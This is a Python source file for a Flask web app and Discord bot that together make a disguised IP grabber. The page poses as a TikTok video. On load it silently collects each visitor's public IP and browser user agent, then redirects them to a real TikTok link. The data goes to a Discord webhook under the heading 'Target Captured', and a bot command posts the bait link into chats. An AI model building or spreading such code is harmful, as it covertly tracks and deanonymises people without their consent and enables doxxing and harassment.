# language: Python, file: app.py
import os
import socket
import requests
import threading
import discord
from discord.ext import commands
from flask import Flask, request, render_template_string

_orig_getaddrinfo = socket.getaddrinfo
def getaddrinfo_ipv4(host, port, family=0, type=0, proto=0, flags=0):
    return _orig_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
socket.getaddrinfo = getaddrinfo_ipv4

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
RAILWAY_URL = "https://rnbw-production.up.railway.app"

@app.route('/')
def index():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>TikTok</title>
        <meta property="og:type" content="video.other">
        <meta property="og:site_name" content="TikTok">
        <meta property="og:title" content="Video">
        <meta property="og:image" content="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
        <script>
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => {
                    fetch('/log', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ip: d.ip, ua: navigator.userAgent})
                    }).then(() => {
                        window.location.href = "https://www.tiktok.com/@only.edits_cc/video/7689816505713790240";
                    });
                });
        </script>
    </head>
    </html>
    """)

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    ip = data.get('ip', 'Unknown')
    ua = data.get('ua', 'Unknown')
    device = "Windows PC" if "Windows" in ua else "iPhone" if "iPhone" in ua else "Android" if "Android" in ua else "Mac" if "Macintosh" in ua else "Unknown"
    payload = {"embeds": [{"title": "Target Captured", "color": 65280, "fields": [{"name": "Device Name", "value": f"```{device}```", "inline": False},{"name": "Public IP", "value": f"```{ip}```", "inline": False}]}]}
    if WEBHOOK_URL: requests.post(WEBHOOK_URL, json=payload)
    return "ok", 200

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}', flush=True)

@bot.command()
async def send(ctx):
    embed = discord.Embed(color=0x2b2d31)
    embed.url = RAILWAY_URL
    embed.set_image(url="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg")
    await ctx.send(embed=embed)

def run_bot():
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print(f"BOT CRASHED: {e}", flush=True)

threading.Thread(target=run_bot, daemon=True).start()
